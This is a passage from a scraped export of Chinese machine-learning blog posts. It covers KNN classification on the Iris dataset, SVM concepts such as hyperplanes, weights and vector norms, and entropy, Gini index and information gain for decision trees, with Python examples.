[5.332441248,2.088626775,1], [6.922596716,1.77106367,1], [8.675418651,-0.242068655,1], [7.673756466,3.508563011,1] ] for n in range(len(dataset)): prediction = predict_classification(dataset, dataset[n], 5) print('Expected %d, Got %d.' % (dataset[n][-1], prediction)) # Expected 0, Got 0. # Expected 0, Got 0. # Expected 0, Got 0. # Expected 0, Got 0. # Expected 0, Got 0. # Expected 1, Got 1. # Expected 1, Got 1. # Expected 1, Got 1. # Expected 1, Got 1. # Expected 1, Got 1. 运行结果打印了预期分类与从数据集中 3 个相进邻居预测结果是一直的。\n鸢尾花种实例 这里使用的是 Iris Flower Species 数据集。\n鸢尾花数据集是根据鸢尾花的测量值预测花卉种类。这是一个多类分类问题。每个类的观察数量是平衡的。有 150 个观测值，有 4 个输入变量和 1 个输出变量。变量名称如下：\n萼片长度以厘米为单位。 萼片宽度以厘米为单位。 花瓣长度以厘米为单位。 花瓣宽度以厘米为单位。 真实类型 更多的关于数据集的说明可以参考：Iris-databases数据集的说明\nPrerequisite 实验的步骤大概分为如下：\n加载数据集并将数据转换为可用于均值和标准差计算的数字。将属性转为float，将类别转换为int。 使 5折的K折较差验证（K-Fold CV）评估该算法。 Start from random import seed from random import randrange from csv import reader from math import sqrt # 加载CSV def load_csv(filename): dataset = list() with open(filename, 'r') as file: csv_reader = reader(file) for row in csv_reader: if not row: continue dataset.append(row) return dataset # 转换所有的值为float方便运算 def str_column_to_float(dataset, column): for row in dataset: row[column] = float(row[column].strip()) # 转换所有的类型为int def str_column_to_int(dataset, column): class_values = [row[column] for row in dataset] unique = set(class_values) lookup = dict() for i, value in enumerate(unique): lookup[value] = i for row in dataset: row[column] = lookup[row[column]] return lookup # # k-folds CV函数进行划分 def cross_validation_split(dataset, n_folds): dataset_split = list() dataset_copy = list(dataset) # 平均分成n_folds折数 fold_size = int(len(dataset) / n_folds) for _ in range(n_folds): fold = list() while len(fold) \u0026lt; fold_size: index = randrange(len(dataset_copy)) fold.append(dataset_copy.pop(index)) dataset_split.append(fold) return dataset_split # 计算精确度 def accuracy_metric(actual, predicted): correct = 0 for i in range(len(actual)): if actual[i] == predicted[i]: correct += 1 return correct / float(len(actual)) * 100.0 # 评估算法 def evaluate_algorithm(dataset, algorithm, n_folds, *args): \u0026quot;\u0026quot;\u0026quot; 评估算法，计算算法的精确度 :param dataset: list, 数据集 :param algorithm: function, 算法名 :param n_folds: int，折数 :param args: 用于algorithm的参数 :return: None \u0026quot;\u0026quot;\u0026quot; folds = cross_validation_split(dataset, n_folds) # 分成5折 scores = list() for fold in folds: train_set = list(folds) train_set.remove(fold) # 训练集不包含本身 train_set = sum(train_set, []) test_set = list() # 测试集 for row in fold: row_copy = list(row) test_set.append(row_copy) row_copy[-1] = None predicted = algorithm(train_set, test_set, *args) actual = [row[-1] for row in fold] accuracy = accuracy_metric(actual, predicted) scores.append(accuracy) return scores # 欧几里得距离，计算两个向量间距离的算法 def euclidean_distance(row1, row2): distance = 0.0 for i in range(len(row1)-1): distance += (row1[i] - row2[i])**2 return sqrt(distance) # 确定最邻近的邻居 def get_neighbors(train, test_row, num_neighbors): \u0026quot;\u0026quot;\u0026quot; 计算训练集train中所有元素到test_row的距离 :param train: list, 数据集，可以是训练集 :param test_row: list, 新的实例，也就是K :param num_neighbors:int，需要多少个邻居 :return: None \u0026quot;\u0026quot;\u0026quot; distances = list() for train_row in train: dist = euclidean_distance(test_row, train_row) distances.append((train_row, dist)) distances.sort(key=lambda tup: tup[1]) neighbors = list() for i in range(num_neighbors): neighbors.append(distances[i][0]) return neighbors # 与临近值进行比较并预测 def predict_classification(train, test_row, num_neighbors): \u0026quot;\u0026quot;\u0026quot; 计算训练集train中所有元素到test_row的距离 :param train: list, 数据集，可以是训练集 :param test_row: list, 新的实例，也就是K :param num_neighbors:int，需要多少个邻居 :return: None \u0026quot;\u0026quot;\u0026quot; neighbors = get_neighbors(train, test_row, num_neighbors) output_values = [row[-1] for row in neighbors] prediction = max(set(output_values), key=output_values.count) return prediction # kNN Algorithm def k_nearest_neighbors(train, test, num_neighbors): predictions = list() for row in test: output = predict_classification(train, row, num_neighbors) predictions.append(output) return(predictions) # 使用KNN算法计算鸢尾花数据集 seed(1) filename = 'iris.csv' dataset = load_csv(filename) for i in range(len(dataset[0])-1): str_column_to_float(dataset, i) # 转换类型为int str_column_to_int(dataset, len(dataset[0])-1) # 评估算法 n_folds = 5 # 5折 num_neighbors = 5 #取5个邻居 scores = evaluate_algorithm(dataset, k_nearest_neighbors, n_folds, num_neighbors) print('Scores: %s' % scores) print('Mean Accuracy: %.3f%%' % (sum(scores)/float(len(scores)))) # Scores: [96.66666666666667, 96.66666666666667, 100.0, 90.0, 100.0] # Mean Accuracy: 96.667% 上述是对整个数据集的预测百分比，也可以对对应的类的信息进行输出\n首先在类别转换函数 str_column_to_int 中增加打印方法\nfor i, value in enumerate(unique): lookup[value] = i print('[%s] =\u0026gt; %d' % (value, i)) 然后在定义一个新的实例，这个实例是用于预测的信息 row = [5.7,2.9,4.2,1.3] ; 然后修改需要预测的数据，进行预测\n# 原来的整个数据集打分不需要了 # scores = evaluate_algorithm(dataset, k_nearest_neighbors, n_folds, num_neighbors) # print('Scores: %s' % scores) # print('Mean Accuracy: %.3f%%' % (sum(scores)/float(len(scores)))) # 定义一个新数据 row = [5.7,2.9,4.2,1.3] label = predict_classification(dataset, row, num_neighbors) print('Data=%s, Predicted: %s' % (row, label)) # Data=[5.7, 2.9, 4.2, 1.3], Predicted: 1 通过预测，可以看出预测结果属于第 1 类，就知道该花为 Iris-setosa 。\nReference\ndistance measures\nk nearest neighbors implement\n","permalink":"https://www.oomkill.com/2022/06/knn/","summary":"","title":"KNN算法"},{"content":"决策边界 (decision boundary)\n支持向量机获取这些数据点并输出最能分离标签的超平面。这条线是决策边界\n决策平面 （ decision surface ），是将空间划分为不同的区域。位于决策平面一侧的数据被定义为与位于另一侧的数据属于不同的类别。决策面可以作为学习过程的结果创建或修改，它们经常用于机器学习、模式识别和分类系统。\n环境空间 ( Ambient Space)，围绕数学对象即对象本身的空间，如一维 Line ，可以独立研究，这种情况下L则是L；再例如将L作为二维空间 $R^2$ 的对象进行研究，这种情况下 L 的环境空间是 $R^2$。\n超平面（Hyperplane）是一个子空间， N维空间的超平面是其具有维数的平面的子集。就其性质而言，它将空间分成两个半空间，其维度比其环境空间的维度小 1。如果空间是三维的，那么它的超平面就是二维维平面，而如果空间是 2 维的，那么它的超平面就是一维线。支持向量机 (SVM) 通过找到使两个类之间的边距最大化的超平面来执行分类。\n法向量 （Normal） 是垂直于该平面、另一个向量的 90° 角倾斜\n什么是支持向量 支持向量 （Support vectors），靠近决策平面（超平面）的数据点。\n如图所示，从一维平面来看，哪个是分离的超平面？\n一般而言，会有很多种解决方法（超平面），支持向量机就是如何找到最佳方法的解决方案。\n转置运算\n矩阵的转置是原始矩阵的翻转版本，可以通过转换矩阵的行和列来转置矩阵。我们用 $A^T$ 表示矩阵 A 的转置。例如，$$A=\\left[ \\begin{matrix} 1 \u0026amp; 2 \u0026amp; 3 \\ 4 \u0026amp; 5 \u0026amp; 6 \\ \\end{matrix} \\right]$$ ；那么 A 的转置就为 $$A=\\left[ \\begin{matrix} 1 \u0026amp; 4 \\ 2 \u0026amp; 5 \\ 3 \u0026amp; 6 \\ \\end{matrix} \\right]$$ ；\n我们可以将向量的转置作为特例。由于 n 维向量 x 由 n×1 列矩阵表示：$$x=\\left[ \\begin{matrix} x_1 \\ x_2 \\ x_3 \\ \u0026hellip;. \\ x_n \\ \\end{matrix} \\right]$$ ；那么 x 的转置（$x^T$）是一个 $1\\times n$ 行矩阵 $$x^T=\\left[ \\begin{matrix} x_1 \u0026amp; x_2 \u0026amp; x_3 \u0026amp; \u0026hellip; \u0026amp; x_n \\ \\end{matrix} \\right]$$ 。\n权重向量\n$wx+b=0$ w：权重向量 x n维向量 $x_i=[1,2,3\u0026hellip;n]$ $w_i=[1,2,3\u0026hellip;n]$ 每个输入的值都乘以一个“权重” $w_i$。权重是表示计算输出时每个输入的重要性的值\n权重决定了输入对输出的影响程度。 $Y=\\sum(Weight \\times input)+bias$ ；如果输入为 $[x_1,x_2\\ \u0026hellip; ,x_n]$ 权重是：$[w_1,w_2\\ \\ ,w_n]$\n通过场景来理解\n假设预估汽车的价格，汽车的价格取决于制造年份和行驶里程数。让我们假设汽车的年份越高，汽车价格越高。随后，汽车开得越多，汽车就越便宜。\n这个例子应该可以帮助您了解汽车价格与制造年份之间存在正相关关系，而汽车价格与其行驶里程之间存在负关关系。因此，我们希望看到代表年份的特征的权重为正，代表里程的特征的权重为负。公式为：$car = (w_1x\\ ear+w_2x\\ miles)$\n偏差 bais 是一个常数 const ，偏差用于将影响函数的结果向正或负方向移动。bias 会被被添加到 input 和 weight 的乘积中。偏差用于抵消结果。$x_1w_1+x_2w_2\u0026hellip;x_nw_n+bias$\n通过场景来理解\n假设希望在输入为 0 时返回 2。由于权重和输入的乘积之和为 0，您将如何确保返回 2？此时可以添加2的bias。如果不包含偏差，只是对 input 和 weight 执行矩阵乘法。这将很容易导致过度拟合数据集。\n过度拟合（overfitting）是指机器学习算模型在训练集上的误差和测试集上的误差之间差异过大。造成过度拟合的原因可能有多种．最常见的就是模型容量过高，模型过于复杂，换句话说是模型假设所包含的参数数量过多．如此一来，算法会将训练集中所包含的没有普遍性的一些特征也学习进来，结果降低了模型的泛化能力．\nhttps://machine-learning.paperspace.com/wiki/weights-and-biases\n范数\n向量的范数（norm）是它的长度 ，x的范数表示为 $\\parallel x \\parallel$；常用的范数为 P 范数，其中 P 是大于等于1的任何数，向量 x的 p 范数表示为 $\\parallel x \\parallel_p$ ；通常情况下向量 x 的 p 范数的计算公式为： $\\parallel x \\parallel_p = (x_1^p+x_2^p+x_3^p+ \\ \u0026hellip;\\ x_n^p)^{1/p}$ ；公式可以简写为：$\\parallel x \\parallel_p = (\\sum_{i=1}^n\\ x_i^p)^{1/p}$\n曼哈顿距离\n曼哈顿距离也被称为1-范数 1-norm，因为它测量的中两点之间的距离。假设：向量a，我们必须计算 1-范式 $\\vec{a} = [2,3]$ ，在图像中表示（红色线部分表示向量a的1-范式）\n通过公式来计算1-范式，可以将p替换为1，$\\parallel a \\parallel_1 = (x_1 + x_2) = (2+3)^1=5$\n欧几里得范数\n欧几里得范数又被称作2-范数 2-norm ，是范数中最常用的范数，欧几里得范数返回的是两点之间最短的距离，因此 $\\vec{a}$ 的2-范式为 $\\parallel x \\parallel_2 = (2^2+3^2)^{\\frac{1}{2}} = (4+9)^{\\frac{1}{2}} = \\sqrt{13}$ ；用图像表示为（红线部分表示2-范数，这是 $\\vec{a}$ 表示的点到点之间的最低按距离）\n无穷范数\n无穷范数 Infinity-norm 是返回给定向量中的最大绝对值；$\\vec{a}$ 的无穷范式为 $\\parallel a \\parallel_\\infty = 3$ （公式求得是上述图中 $[2,3]$ 这个实例）。\n例如，如果我们必须找到一个向量的无穷范数，比如 $\\vec{b}$ ，$\\vec{b} = [4,3,-1]$ ；那么 $\\parallel b \\parallel_\\infty = 6$ （这里最大是4，但是返回的是一个绝对值所以是6）\nReference norm\nvector norms\n拉格朗日乘子法\n拉格朗日乘子法 Lagrange multiplier，是一种寻找受等式约束的函数的局部最大值和最小值的策略（即，必须满足一个或多个方程必须完全满足所选变量值的条件）\n设置超平面为 $wx+b=0$ ，其中 $w=[1,2,\\ ..,\\ n]$ ，w是 $n \\times 1$ 维，n特征值的个数，x 训练的示例，b是bias，一个二维的超平面的特征为：$x=[x_1,x_2]$ ，$w=[w_1,w_2]$ ，b看做 wegiht $w_0$ ，\n那么这个超平面的方程就为：$$ f(n) \\begin{cases} w_1x_1+w_2x_2+w0 = 0\\ \\ 超平面(决策边界)方程 \\ w_1x_1+w_2x_2+w0 \u0026gt; 0\\ \\ 超平面(决策边界)上部分 \\ w_1x_1+w_2x_2+w0 \u0026lt; 0\\ \\ 超平面(决策边界)下部分 \\ \\end{cases} $$ ，那么在对公式进行分解，增加参数 y ，代表了对向量的分类，也就是说超平面两边的向量，这样公式为：$$ f(n) \\begin{cases} w_1x_1+w_2x_2+w0 \\ge 1\\ \\ 当 y_i = +1 \\ w_1x_1+w_2x_2+w0 \\le 1\\ \\ 当 y_i = -1 \\ \\end{cases} $$\n","permalink":"https://www.oomkill.com/2022/06/decision-boundary/","summary":"","title":"决策边界算法"},{"content":"熵和基尼指数 信息增益 信息增益 information gain 是用于训练决策树的指标。具体来说，是指这些指标衡量拆分的质量。通俗来说是通过根据随机变量的给定值拆分数据集来衡量熵。\n通过描述一个事件是否\u0026quot;惊讶\u0026quot;，通常低概率事件更令人惊讶，因此具有更大的信息量。而具有相同可能性的事件的概率分布更\u0026quot;惊讶\u0026quot;并且具有更大的熵。\n定义：熵 entropy是一组例子中杂质、无序或不确定性的度量。熵控制决策树如何决定拆分数据。它实际上影响了决策树如何绘制边界。\n熵 熵的计算公式为：$E=-\\sum^i_{i=1}(p_i\\times\\log_2(p_i))$ ；$P_i$ 是类别 $i$ 的概率。我们来举一个例子来更好地理解熵及其计算。假设有一个由三种颜色组成的数据集，红色、紫色和黄色。如果我们的集合中有一个红色、三个紫色和四个黄色的观测值，我们的方程变为：$E=-(p_r \\times \\log_2(p_r) + p_p \\times \\log_2(p_p) + p_y \\times \\log_2(p_y)$\n其中 $p_r$ 、$p_p$ 和 $p_y$ 分别是选择红色、紫色和黄色的概率。假设 $p_r=\\frac{1}{8}$，$p_p=\\frac{3}{8}$ ，$p_y=\\frac{4}{8}$ 现在等式变为变为：\n$E=-(\\frac{1}{8} \\times \\log_2(\\frac{1}{8}) + \\frac{3}{8} \\times \\log_2(\\frac{3}{8}) + \\frac{4}{8} \\times \\log_2(\\frac{4}{8}))$ $0.125 \\times log_2(0.125) + 0.375 \\times log_2(0.375) + 0.5 \\times log_2(0.375)$ $0.125 \\times -3 + 0.375 \\times -1.415 + 0.5 \\times -1 = -0.375+-0.425 +-0.5 = 1.41$ ==当所有观测值都属于同一类时会发生什么？== 在这种情况下，熵将始终为零。$E=-(1log_21)=0$ ；这种情况下的数据集没有杂质，这就意味着没有数据集没有意义。又如果有两类数据集，一半是黄色，一半是紫色，那么熵为1，推导过程是：$E=−(\\ (0.5\\log_2(0.5))+(0.5\\times \\log_2(0.5))\\ ) = 1$\n基尼指数 基尼指数 Gini index 和熵 entropy 是计算信息增益的标准。决策树算法使用信息增益来拆分节点。\n基尼指数计算特定变量在随机选择时被错误分类的概率程度以及基尼系数的变化。它适用于分类变量，提供“成功”或“失败”的结果，因此仅进行二元拆分（二叉树结构）。基尼指数在 0 和 1 之间变化，其中，1 表示元素在各个类别中的随机分布。基尼指数为 0.5 表示元素在某些类别中分布均匀。：\n0 表示为所有元素都与某个类相关联，或只存在一个类。 1 表示所有元素随机分布在各个类中，并且0.5 表示元素均匀分布到某些类中 基尼指数公式：$1− \\sum_n^{i=1}(p_i)^2$ ； $P_i$ 为分类到特定类别的概率。在构建决策树时，更愿意选择具有最小基尼指数的属性作为根节点。\n通过实例了解公式\nPast Trend Open Interest Trading Volume Return Positive Low High Up Negative High Low Down Positive Low High Up Positive High High Up Negative Low High Down Positive Low Low Down Negative High High Down Negative Low High Down Positive Low Low Down Positive High High Up 计算基尼指数\n已知条件\n$P(Past\\ Trend=Positive) = \\frac{6}{10}$\n$P(Past\\ Trend=Negative) = \\frac{4}{10}$\n过去趋势基尼指数计算\n如果过去趋势为正面，回报为上涨，概率为：$P(Past\\ Trend=Positive\\ \u0026amp;\\ Return=Up) = \\frac{4}{6}$\n如果过去趋势为正面，回报为下降，概率为：$P(Past\\ Trend=Positive\\ \u0026amp;\\ Return=Down) = \\frac{2}{6}$\n那么这个基尼指数为：$gini(Past\\ Trend) = 1-(\\frac{4}{6}^2+\\frac{2}{6}^2) = 0.45$ 如果过去趋势为负面，回报为上涨，概率为：$P(Past\\ Trend=Negative\\ \u0026amp;\\ Return=Up) = 0$\n如果过去趋势为负面，回报为下降，概率为：$P(Past\\ Trend=Negative\\ \u0026amp;\\ Return=Down) = \\frac{4}{4}$\n那么这个基尼指数为：$gini(Past\\ Trend=Negative) = 1-(0^2+\\frac{4}{4}^2) = 1-(0+1)=0$ 那么过去交易量的的基尼指数加权 = $\\frac{6}{10} \\times 0.45 + \\frac{4}{10}\\times 0 = 0.27$\n未平仓量基尼指数计算\n已知条件\n$P(Open\\ Interest=High): \\frac{4}{10}$ $P(Open\\ Interest=Low): \\frac{6}{10}$ 如果未平仓量为 high 并且回报为上涨，概率为：$P(Open\\ Interest = High\\ \u0026amp;\\ Return\\ = Up)=\\frac{2}{4}$\n如果未平仓量为 high 并且回报为下降，概率为：$P(Open\\ Interest = High\\ \u0026amp;\\ Return\\ = Down)=\\frac{2}{4}$\n那么这个基尼指数为：$gini(Open\\ Interest=High) = 1-(\\frac{2}{4}^2+\\frac{2}{4}^2) = 0.5$ 如果未平仓量为 low 并且回报为上涨，概率为：$P(Open\\ Interest = High\\ \u0026amp;\\ Return\\ = Up)=\\frac{2}{6}$\n如果未平仓量为 low 并且回报为下降，概率为：$P(Open\\ Interest = High\\ \u0026amp;\\ Return\\ = Down)=\\frac{4}{6}$\n那么这个基尼指数为：$gini(Open\\ Interest=Low) = 1-(\\frac{2}{6}^2+\\frac{4}{6}^2) = 0.45$ 那么未平仓量基尼指数加权 = $\\frac{4}{10} \\times 0.5 + \\frac{6}{10}\\times 0.45 = 0.47$\n计算交易量基尼指数\n已知条件\n$P(Trading\\ Volume=High): \\frac{7}{10}$ $P(Trading\\ Volume=Low): \\frac{3}{10}$ 如果交易量为 high 并且回报为上涨，概率为：$P(Trading\\ Volume=High\\ \u0026amp;\\ Return\\ = Up)=\\frac{4}{7}$\n如果交易量为 high 并且回报为下降，概率为：$P(Trading\\ Volume = High\\ \u0026amp;\\ Return\\ = Down)=\\frac{3}{7}$\n那么这个基尼指数为：$gini(Trading\\ Volume=High) = 1-(\\frac{4}{7}^2+\\frac{3}{7}^2) = 0.49$ 如果交易量为 low 并且回报为上涨，概率为：$P(Trading\\ Volume = Low\\ \u0026amp;\\ Return\\ = Up)=0$\n如果交易量为 low 并且回报为下降，概率为：$P(Trading\\ Volume = Low\\ \u0026amp;\\ Return\\ = Down)=\\frac{3}{3}$\n那么这个基尼指数为：$gini(Trading\\ Volume=Low) = 1-(0^2+1^2) = 0$ 那么交易量基尼指数加权 = $\\frac{7}{10} \\times 0.49 + \\frac{3}{10}\\times 0 = 0.34$\n最终计算出的基尼指数列表如下，在表中可以观察到“Past Trend”的基尼指数最低，因此它将被选为决策树的根节点。\nAttributes Gini Index Past Trend 0.27 Open Interest 0.47 Trading Volume 0.34 这里将重复的过程来确定决策树的子节点或分支。将通过计算”Past Trend“的“Positive”分支的基尼指数如下：\nPast Trend Open Interest Trading Volume Return Positive Low High Up Positive Low High Up Positive High High Up Positive Low Low Down Positive Low Low Down Positive High High Up 针对过去正面趋势计算未平仓量的基尼指数\n已知条件\n$P(Open\\ Interest=High): \\frac{2}{6}$ $P(Open\\ Interest=Low): \\frac{4}{6}$ 如果未平仓量为 high 并且回报为上涨，概率为：$P(Open\\ Interest = High\\ \u0026amp;\\ Return\\ = Up)=\\frac{2}{2}$\n如果未平仓量为 high 并且回报为下降，概率为：$P(Open\\ Interest = High\\ \u0026amp;\\ Return\\ = Down)=0$\n那么这个基尼指数为：$gini(Open\\ Interest=High) = 1-(\\frac{2}{2}^2+0^2) = 0$ 如果未平仓量为 low 并且回报为上涨，概率为：$P(Open\\ Interest = Low\\ \u0026amp;\\ Return\\ = Up)=\\frac{2}{4}$\n如果未平仓量为 low 并且回报为下降，概率为：$P(Open\\ Interest = Low\\ \u0026amp;\\ Return\\ = Down)=\\frac{2}{4}$\n那么这个基尼指数为：$gini(Open\\ Interest=Low) = 1-(\\frac{2}{4}^2+\\frac{2}{4}^2) = 0.5$ 那么未平仓量基尼指数加权 = $\\frac{2}{6} \\times 0 + \\frac{4}{6}\\times 0.5 = 0.33$\n计算交易量基尼指数\n已知条件\n$P(Trading\\ Volume=High): \\frac{4}{6}$ $P(Trading\\ Volume=Low): \\frac{2}{6}$ 如果交易量为 high 并且回报为上涨，概率为：$P(Trading\\ Volume=High\\ \u0026amp;\\ Return\\ = Up)=\\frac{4}{4}$\n如果交易量为 high 并且回报为下降，概率为：$P(Trading\\ Volume = High\\ \u0026amp;\\ Return\\ = Down)=0$\n那么这个基尼指数为：$gini(Trading\\ Volume=High) = 1-(\\frac{4}{4}^2+0^2) = 0$ 如果交易量为 low 并且回报为上涨，概率为：$P(Trading\\ Volume = Low\\ \u0026amp;\\ Return\\ = Up)=0$\n如果交易量为 low 并且回报为下降，概率为：$P(Trading\\ Volume = Low\\ \u0026amp;\\ Return\\ = Down)=\\frac{2}{2}$\n那么这个基尼指数为：$gini(Trading\\ Volume=Low) = 1-(0^2+\\frac{2}{2}^2) = 0$ 那么交易量基尼指数加权 = $\\frac{4}{6} \\times 0 + \\frac{2}{6}\\times 0 = 0$\n最终计算出的基尼指数列表如下，这里将使用“Trading Volume”进一步拆分节点，因为它具有最小的基尼指数。\nAttributes/Features Gini Index Open Interest 0.33 Trading Volume 0 最终的模型就如图所示\n计算信息增益示例 我们可以根据属于一类数据的概率分布来考虑数据集的熵，例如，在二进制分类数据集的情况下为两个类。计算样本的熵如 $Entropy = -(P_0 \\times log(P_0) + P_1 \\times log(P_1)$ 。\n两类的样本拆分为 50/50 的数据集将具最大熵（最惊讶），而拆分为 10/90 的不平衡数据集将具有较小的熵。可以通过在 Python 中计算这个不平衡数据集的熵的例子来证明这一点。\nfrom math import log2 # 概率 class0 = 10/100 class1 = 90/100 # entropy formula entropy = -(class0 * log2(class0) + class1 * log2(class1)) # print the result print('entropy: %.3f bits' % entropy) 运行示例，可以看到用于二分类的数据集的熵小于 1 。也就是说，对来自数据集中的任意示例类进行编码所需的信息不到1。通过这种方式，熵可以用作数据集纯度的计算，例如类别分布的平衡程度。\n熵为 0 位表示数据集包含一个类；1或更大位的熵表示平衡数据集的最大熵（取决于类别的数量），介于两者之间的值表示这些极端之间的水平。\n计算信息增益示例 要求：定义一个函数来根据属于 0 类和 1 类的样本的比率来计算一组样本的熵。\n假设有一个20 个示例的数据集，13 个为0 类，7 个为1 类。我们可以计算该数据集的熵，它的熵小于 1 位。\nfrom math import log2 # calculate the entropy for the split in the dataset def entropy(class0, class1): return -(class0 * log2(class0) + class1 * log2(class1)) # split of the main dataset class0 = 13 / 20 class1 = 7 / 20 # calculate entropy before the change s_entropy = entropy(class0, class1) print('Dataset Entropy: %.3f bits' % s_entropy) # Dataset Entropy: 0.934 bits 假设按照 value1 分割数据集，有一组 8 个样本的数据集，7 个为第 0 类，1 个用于第 1 类。然后我们可以计算这组样本的熵。\nfrom math import log2 # calculate the entropy for the split in the dataset def entropy(class0, class1): return -(class0 * log2(class0) + class1 * log2(class1)) # split of the main dataset s1_class0 = 7 / 8 s1_class1 = 1 / 8 # calculate entropy before the change s_entropy = entropy(s1_class0, s1_class1) print('Dataset Entropy: %.3f bits' % s_entropy) # Dataset Entropy: 0.544 bits 假设现在按 value2 分割数据集；一组 12 个样本数据集，每组 6 个。我们希望这个组的熵为 1。\nfrom math import log2 # calculate the entropy for the split in the dataset def entropy(class0, class1): return -(class0 * log2(class0) + class1 * log2(class1)) # split of the main dataset s1_class0 = 6 / 12 s1_class1 = 6 / 12 # calculate entropy before the change s_entropy = entropy(s1_class0, s1_class1) print('Dataset Entropy: %.3f bits' % s_entropy) # Dataset Entropy: 1.000 bits 最后，可以根据为变量的每个值创建的组和计算的熵来计算该变量的信息增益。例如：\n第一个变量从数据集中产生一组 8 个样本，第二组在数据集中有12 个样本。在这种情况下，信息增益计算：\n$Entropy(Dataset) – (\\frac{(Count(Group1)}{Count(Dataset)} \\times Entropy(Group1) + \\frac{Count(Group2)}{Count(Dataset)} \\times Entropy(Group2)))$ 这里是因为在每个子节点重复这个分裂过程直到空叶节点。这意味着每个节点的样本都属于同一类。但是，这种情况下会导致具有许多节点使非常深的树，这很容易导致过度拟合。因此，我们通常希望通过设置树的最大深度来修剪树。IG就是我们想确定给定训练特征向的量集中的哪个属性最有用，那么上面的公式推理就为：\n$IG(D_p) = I(D_p) − \\frac{N_{left}}{N_p}I(D_{left})−\\frac{N_{right}}{N_p}I(D_{right})$ $IG(D_P)$：数据集的信息增益 $I(D)$：叶子的熵或基尼指数 $\\frac{N}{N_P}$ ：页数据集占总数据集的比例 我们将使用它来决定决策树 节点中属性的顺序。该行为在python中表示为：\nfrom math import log2 # calculate the entropy for the split in the dataset def entropy(class0, class1): return -(class0 * log2(class0) + class1 * log2(class1)) # split of the main dataset class0 = 13 / 20 class1 = 7 / 20 # calculate entropy before the change s_entropy = entropy(class0, class1) print('Dataset Entropy: %.3f bits' % s_entropy) # split 1 (split via value1) s1_class0 = 7 / 8 s1_class1 = 1 / 8 # calculate the entropy of the first group s1_entropy = entropy(s1_class0, s1_class1) print('Group1 Entropy: %.3f bits' % s1_entropy) # split 2 (split via value2) s2_class0 = 6 / 12 s2_class1 = 6 / 12 # calculate the entropy of the second group s2_entropy = entropy(s2_class0, s2_class1) print('Group2 Entropy: %.3f bits' % s2_entropy) # calculate the information gain gain = s_entropy - (8/20 * s1_entropy + 12/20 * s2_entropy) print('Information Gain: %.3f bits' % gain) # Dataset Entropy: 0.934 bits # Group1 Entropy: 0.544 bits # Group2 Entropy: 1.000 bits # Information Gain: 0.117 bits 通过实例，就可以很清楚的明白了，信息增益的概念：信息熵-条件熵，换句话来说就是==信息增益代表了在一个条件下，信息复杂度（不确定性）减少的程度==。\npython计算决策树实例 基于基尼指数的决策树 钞票数据集涉及根据从照片中采取的一系列措施来预测给定钞票是否是真实的。数据是取自真钞和伪钞样样本的图像中提取的。对于数字化，使用了通常用于印刷检查的工业相机，从图像中提取特征。\n该数据集包含 1372 行和 5 个数值变量。这是一个二元分类的问题。\n基尼指数 假设有两组数据，每组有 2 行。第一组的行都属于 0 类，第二组的行都属于 1 类，所以这是一个完美的拆分。\n首先需要计算每个组中类的比例。\nproportion = count(class_value) / count(rows) 这个比例是\ngroup_1_class_0 = 2 / 2 = 1 group_1_class_1 = 0 / 2 = 0 group_2_class_0 = 0 / 2 = 0 group_2_class_1 = 2 / 2 = 1 为每个子节点计算 Gini index\ngini_index = sum(proportion * (1.0 - proportion)) gini_index = 1.0 - sum(proportion * proportion) 然后对每组的基尼指数按组的大小加权，例如当前正在分组的所有样本。我们可以将此权重添加到组的基尼指数计算中，如下所示：\ngini_index = (1.0 - sum(proportion * proportion)) * (group_size/total_samples) 在该案例中，每个组的基尼指数为：\nGini(group_1) = (1 - (1*1 + 0*0)) * 2/4 Gini(group_1) = 0.0 * 0.5 Gini(group_1) = 0.0 # 分类1的基尼指数 Gini(group_2) = (1 - (0*0 + 1*1)) * 2/4 Gini(group_2) = 0.0 * 0.5 Gini(group_2) = 0.0 # 分类2的基尼指数 然后在分割点的每个子节点上添加分数，以给出分割点的最终 Gini 分数，该分数可以与其他候选分割点进行比较。如该分割点的基尼系数为 $0.0 + 0.0$ 或完美的基尼系数 0.0。\n编写一个 gini_index() 的函数，用于计算组列表和已知类值列表的基尼指数。\ndef gini_index(groups, classes): print(\u0026quot;------------\u0026quot;) # 计算所有样本的分割点，计算样本的总长度 n_instances = float(sum([len(group) for group in groups])) # 计算每个组的总基尼指数 gini = 0.0 for group in groups: size = float(len(group)) if size == 0: # avoid divide by zero continue score = 0.0 # score the group based on the score for each class for class_val in classes: # row[-1] 代表每个样本的最后一个值，是否存在分类 class_val p = [row[-1] for row in group] p1 = p.count(class_val) / size score += p1 * p1 # 按照对应的样本分割点，加权重 gini += (1.0 - score) * (size / n_instances) return gini print(gini_index([[[1, 1], [1, 0]], [[1, 1], [1, 0]]], [0, 1])) print(gini_index([[[1, 0], [1, 0]], [[1, 1], [1, 1]]], [0, 1])) 运行该示例会打印两组的Gini index，最差情况的为 0.5，最少情况的指数为 0.0。\n拆分 数据拆分 拆分是由数据集中的一个属性和一个值组成。可以将其总结为要拆分的属性的索引和拆分该属性上的行的值。这只是索引数据行的有用简写。\n创建拆分涉及三个部分，我们已经看过的第一个部分是计算基尼分数。剩下的两部分是：\n拆分数据集。 评估所有拆分。 拆分数据是给定数据集索引和拆分值，将数据集拆分为两个行列表形成一个分类。具体是拆分数据集涉及遍历每一行，检查属性值是否低于或高于拆分值，并将其分别分配给左组或右组。当存在两个组时，可以按照基尼指数进行评估\n编写一个**test_split()**函数，它实现了拆分。\ndef test_split(index, value, dataset): left, right = list(), list() for row in dataset: if row[index] \u0026lt; value: left.append(row) else: right.append(row) return left, right 评估拆分的数据 给定一个数据集，必须检查每个属性上的每个值作为候选拆分，评估拆分的成本并找到我们可以进行的最佳拆分。一旦找到最佳值，就可以将其用作决策树中的节点。\n这里使用 dict 作为决策树中的节点，因为这样可以按名称存储数据。选择最佳基尼指数并将其用作树的新节点。\n每组数据都是其小数据集，其中仅包含通过拆分过程分配给左组或右组的那些行。可以想象我们如何在构建决策树时递归地再次拆分每个组。\ndef get_split(dataset): class_values = list(set(row[-1] for row in dataset)) b_index, b_value, b_score, b_groups = 999, 999, 999, None for index in range(len(dataset[0])-1): for row in dataset: groups = test_split(index, row[index], dataset) gini = gini_index(groups, class_values) if gini \u0026lt; b_score: b_index, b_value, b_score, b_groups = index, row[index], gini, groups return {'index':b_index, 'value':b_value, 'groups':b_groups} 之后准备一些测试数据集进行测试，其中 $Y$ 是测试集的分类\nX1\tX2\tY 2.771244718\t1.784783929\t0 1.728571309\t1.169761413\t0 3.678319846\t2.81281357\t0 3.961043357\t2.61995032\t0 2.999208922\t2.209014212\t0 7.497545867\t3.162953546\t1 9.00220326\t3.339047188\t1 